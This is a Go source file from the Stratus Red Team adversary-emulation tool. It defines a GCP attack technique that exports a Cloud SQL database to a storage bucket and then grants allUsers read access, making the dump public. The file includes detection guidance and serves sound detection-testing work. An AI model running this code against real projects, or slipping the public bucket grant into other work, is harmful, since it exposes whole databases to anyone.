package gcp

import (
	"context"
	_ "embed"
	"fmt"
	"log"
	"time"

	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	sqladmin "google.golang.org/api/sqladmin/v1"
	storagev1 "google.golang.org/api/storage/v1"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "gcp.exfiltration.share-cloud-sql-backup",
		FriendlyName: "Exfiltrate a Cloud SQL Database via GCS Export",
		Description: `
Exfiltrates a Cloud SQL database by exporting it to a GCS bucket, then making the
exported file publicly accessible. This simulates an attacker who has compromised
a GCP service account with Cloud SQL and Storage Admin rights, and uses them to
extract a full database dump and expose it to the internet.

Warm-up:

- Create a Cloud SQL MySQL 8.0 instance (<code>db-f1-micro</code>)
- Create a GCS bucket to receive the export

Detonation:

- Export the Cloud SQL <code>mysql</code> database to
  <code>gs://&lt;bucket&gt;/export.sql</code> using the Cloud SQL Admin API
- Wait for the export operation to complete
- Grant <code>roles/storage.objectViewer</code> to <code>allUsers</code> on the
  export bucket, making the database dump publicly readable

References:

- https://cloud.google.com/sql/docs/mysql/import-export/exporting
- https://cloud.google.com/sql/docs/mysql/admin-api/rest/v1/instances/export
- https://cloud.google.com/storage/docs/access-control/iam
- https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security/gcp-post-exploitation/gcp-cloud-sql-post-exploitation
- https://securitylabs.datadoghq.com/articles/google-cloud-threat-detection/
- https://www.praetorian.com/blog/cloud-data-exfiltration-via-gcp-storage-buckets-and-how-to-prevent-it/
`,
		Detection: `
Identify when a Cloud SQL instance exports its database to GCS by monitoring for
<code>cloudsql.instances.export</code> events in GCP Admin Activity audit logs.
Additionally, alert on <code>storage.setIamPermissions</code> events where a binding
grants <code>roles/storage.objectViewer</code> to <code>allUsers</code> on the
destination bucket, which indicates the exported data is being made publicly accessible.
`,
		Platform:                   stratus.GCP,
		IsIdempotent:               false,
		IsSlow:                     true,
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Exfiltration},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func newSQLAdminService(ctx context.Context, providers stratus.CloudProviders) (*sqladmin.Service, error) {
	svc, err := sqladmin.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return nil, fmt.Errorf("failed to create Cloud SQL Admin client: %w", err)
	}
	return svc, nil
}

func newStorageService(ctx context.Context, providers stratus.CloudProviders) (*storagev1.Service, error) {
	svc, err := storagev1.NewService(ctx, providers.GCP().Options())
	if err != nil {
		return nil, fmt.Errorf("failed to create Storage client: %w", err)
	}
	return svc, nil
}

// waitForSQLOperation polls a Cloud SQL long-running operation until it completes.
func waitForSQLOperation(ctx context.Context, svc *sqladmin.Service, projectId string, opName string) error {
	const maxAttempts = 60
	const pollInterval = 10 * time.Second

	for attempt := 0; attempt < maxAttempts; attempt++ {
		op, err := svc.Operations.Get(projectId, opName).Context(ctx).Do()
		if err != nil {
			return fmt.Errorf("failed to poll Cloud SQL operation %s: %w", opName, err)
		}
		if op.Status == "DONE" {
			if op.Error != nil && len(op.Error.Errors) > 0 {
				return fmt.Errorf("Cloud SQL operation %s failed: %s", opName, op.Error.Errors[0].Message)
			}
			return nil
		}
		log.Printf("Waiting for Cloud SQL export operation to complete (attempt %d/%d, status: %s)\n",
			attempt+1, maxAttempts, op.Status)
		time.Sleep(pollInterval)
	}
	return fmt.Errorf("Cloud SQL operation %s did not complete after %d attempts", opName, maxAttempts)
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	gcp := providers.GCP()
	projectId := gcp.GetProjectId()
	instanceName := params["instance_name"]
	bucketName := params["bucket_name"]
	ctx := context.Background()

	sqlSvc, err := newSQLAdminService(ctx, providers)
	if err != nil {
		return err
	}

	exportURI := "gs://" + bucketName + "/export.sql"
	log.Printf("Exporting Cloud SQL instance %s to %s\n", instanceName, exportURI)
	exportOp, err := sqlSvc.Instances.Export(projectId, instanceName, &sqladmin.InstancesExportRequest{
		ExportContext: &sqladmin.ExportContext{
			Kind:      "sql#exportContext",
			FileType:  "SQL",
			Uri:       exportURI,
			Databases: []string{"mysql"},
		},
	}).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to start Cloud SQL export for instance %s: %w", instanceName, err)
	}

	log.Printf("Export operation %s started, waiting for completion...\n", exportOp.Name)
	if err = waitForSQLOperation(ctx, sqlSvc, projectId, exportOp.Name); err != nil {
		return err
	}
	log.Printf("Cloud SQL export to %s completed successfully\n", exportURI)

	storageSvc, err := newStorageService(ctx, providers)
	if err != nil {
		return err
	}

	policy, err := storageSvc.Buckets.GetIamPolicy(bucketName).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to get IAM policy for bucket %s: %w", bucketName, err)
	}

	policy.Bindings = append(policy.Bindings, &storagev1.PolicyBindings{
		Role:    "roles/storage.objectViewer",
		Members: []string{"allUsers"},
	})

	log.Printf("Granting allUsers:roles/storage.objectViewer on bucket %s to expose the database export\n", bucketName)
	_, err = storageSvc.Buckets.SetIamPolicy(bucketName, policy).Context(ctx).Do()
	if err != nil {
		return fmt.Errorf("failed to set public IAM policy on bucket %s: %w", bucketName, err)
	}

	log.Printf("Database export is now publicly accessible at https://storage.googleapis.com/%s/export.sql\n", bucketName)
	return nil
}
